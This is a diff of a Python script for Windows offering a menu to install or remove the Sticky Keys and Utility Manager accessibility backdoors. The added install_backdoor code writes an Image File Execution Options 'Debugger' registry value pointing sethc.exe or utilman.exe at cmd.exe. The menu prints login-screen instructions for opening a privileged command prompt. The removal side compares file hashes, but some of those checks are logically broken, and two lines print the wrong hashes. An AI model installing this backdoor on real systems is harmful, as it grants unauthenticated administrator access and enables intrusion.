@@ -1,15 +1,27 @@
-import sys
 import os
-import win32com.shell.shell as shell
 import subprocess
-import ctypes
 import winreg
 from hash import calculate_sha256, calculate_md5
 from config import header, bar
-import time
+
+
+def install_backdoor(path):
+    fileName = os.path.basename(path).strip(' ')
+
+    print("Adding " + fileName + " backdoor to registry.")
+    try:
+        key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, path)
+        try:
+            winreg.SetValueEx(key, 'Debugger', 0, winreg.REG_SZ, cmdPath)
+        except Exception as e:
+            print(e)
+            print("Error: Could not create subkey. Please run with Administrator privileges.")
+    except Exception as e:
+        print(e)
+        print("Error: Could not create key. Please run with Administrator privileges.")
+
 
 def remove_backdoor(path):
-    print(bar)
     fileName = os.path.basename(path).strip(' ')
     print("Checking for " + fileName + " file replacement.")
     cmd = ("Get-ItemProperty " + path + " | select versioninfo | format-list")
@@ -24,58 +36,55 @@ def remove_backdoor(path):
             print(line.strip('\n \t'))
             if fileName.strip('2.exe') not in line:
                 print(fileName + "file has been replaced.")
+                # TODO: provide download link
                 print("Please download a legitimate version from Microsoft.")
 
-    print("Validating " + fileName + " hash against cmd.exe and explorer.exe hashes")
+    print("Validating " + fileName + " hash against cmd.exe, explorer.exe, and powershell.exe hashes")
+    # calculate hashes
     sha256 = calculate_sha256(path)
     Md5 = calculate_md5(path)
     cmdSha = calculate_sha256(cmdPath)
     cmdMd5 = calculate_md5(cmdPath)
     explorerSha = calculate_sha256(explorerPath)
     explorerMd5 = calculate_md5(explorerPath)
-    if sha256 == (cmdSha or explorerSha) or Md5 == (cmdMd5 or explorerMd5):
+    powershellSha = calculate_sha256(powershellPath)
+    powershellMd5 = calculate_md5(powershellPath)
+    if sha256 == (cmdSha or explorerSha or powershellSha) or Md5 == (cmdMd5 or explorerMd5 or powershellMd5):
         print(fileName + " file has been replaced.")
         print(fileName + " Sha256:\n" + sha256)
         print("cmd.exe Sha256:\n" + cmdSha)
         print("explorer.exe Sha256:\n" + explorerSha)
+        print("powershell.exe Sha256:\n" + explorerSha)
         print(fileName + "MD5:\n" + Md5)
         print("cmd.exe MD5:\n" + cmdMd5)
         print("explorer.exe MD5:\n" + explorerMd5)
+        print("powershell.exe MD5:\n" + explorerMd5)
+        # TODO: provide download link
+        print("Please download a legitimate version from Microsoft.")
     else:
-        print(fileName + " hashes do not match cmd.exe or explorer.exe.")
+        print(fileName + " hashes do not match cmd.exe, explorer.exe, or powershell.exe")
 
     print("Performing " + fileName + " registry analysis.")
 
     registryPath = "SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\\" + fileName
 
+    # test if key exists
     try:
-        # TODO: You must remove all sub keys before removing the key
         key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, registryPath, 0, winreg.KEY_ALL_ACCESS)
-        # winreg.DeleteKey(key, fileName)
     except:
         print(fileName + " backdoor registry entry not found.")
         return
 
-    # key was found, just use cmd
+    # key was found
     print(fileName + " backdoor registry entry found, removing...")
     cmd = ('REG DELETE "HKLM\\' + registryPath + '" /f')
-    os.system(cmd)
-
-def install_backdoor(path):
-    fileName = os.path.basename(path).strip(' ')
-
-    print("Adding " + fileName + " backdoor to registry.")
     try:
-        key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, path)
-    except Exception as e:
-        print(e)
-    try:
-        winreg.SetValueEx(key, 'Debugger', 0, winreg.REG_SZ, cmdPath)
-        # os.system('REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /t REG_SZ /v Debugger /d "C:\windows\system32\cmd.exe" /f')
+        os.system(cmd)
     except Exception as e:
         print(e)
 
-#TODO: elevate to admin access (compile as exe?), get rid of repeated code, research other backdoors, add powershell, implement config
+
+#TODO: elevate to admin access (compile as exe?)
 if __name__ == "__main__":
     print(header)
 
@@ -91,41 +100,59 @@ if __name__ == "__main__":
 
     while True:
         print(bar)
-        time.sleep(.5)
-        print("Please select from the following options:")
         print("[I]nstall Backdoor.\n[R]emove Backdoor.\n[C]onfigure Settings.\n[E]xit the Program.")
-        choice = input("[ ]").lower()
+        choice = input("[>]").lower()
         # install backdoor
         if choice == 'i':
             print(bar)
-            print("WARNING: THIS WILL ALLOW ANYONE ADMIN ACCESS TO THIS SYSTEM AT LOGIN SCREEN.")
+            print("*WARNING: THIS WILL ALLOW UNAUTHORIZED ACCESS*")
             print("Which backdoor would you like to install?")
             print("[S]ticky Keys (sethc.exe).")
             print("[U]tility Manager (utilman.exe).")
             print("[B]oth.")
-            print("[R]eturn to main menu.")
-            print("[E]xit the Program.")
-            choice = input("[ ]").lower()
+            print("[R]eturn to the Main Menu.")
+            choice = input("[>]").lower()
             if choice == 's':
+                print("At login screen, press shift 5 times to open command prompt.")
                 install_backdoor(sethcRegistryPath)
             elif choice == 'u':
+                print("At login screen, press [Windows Key + U] to open command prompt.")
+
                 install_backdoor(utilmanRegistryPath)
             elif choice == 'b':
+                print("At login screen, press shift 5 times or\n[Windows Key + U] to open command prompt.")
                 install_backdoor(sethcRegistryPath)
                 install_backdoor(utilmanRegistryPath)
             elif choice == 'r':
                 continue
-            elif choice == 'e':
-                print("Exiting...")
-                exit(0)
+            else:
+                print("Incorrect input.")
+                continue
         # remove backdoor
-        if choice == 'r':
+        elif choice == 'r':
+            print(bar)
             remove_backdoor(sethcPath)
             remove_backdoor(utilmanPath)
-        # TODO: implement configuration
-        if choice == 'c':
+        elif choice == 'c':
             print("***Under Construction***\nPlease post any suggestions for configuration to www.github.com/gitgiant")
+            print("[D]isable Accessibility in Registry.")
+            print("[E]nable Accessibility in Registry.")
+            print("[R]eturn to the Main Menu.")
+            choice = input("[>]").lower()
+            # TODO: Registry files do not work
+            if choice == 'd':
+                os.system("AccessibilityOFF.reg")
+            elif choice == 'e':
+                os.system("AccessibilityON.reg")
+            elif choice == 'r':
+                continue
+            else:
+                print("Incorrect input.")
+                continue
         # exit
-        if choice == 'e':
+        elif choice == 'e':
             print("Exiting...")
             exit(0)
+        else:
+            print("Incorrect input.")
+            continue
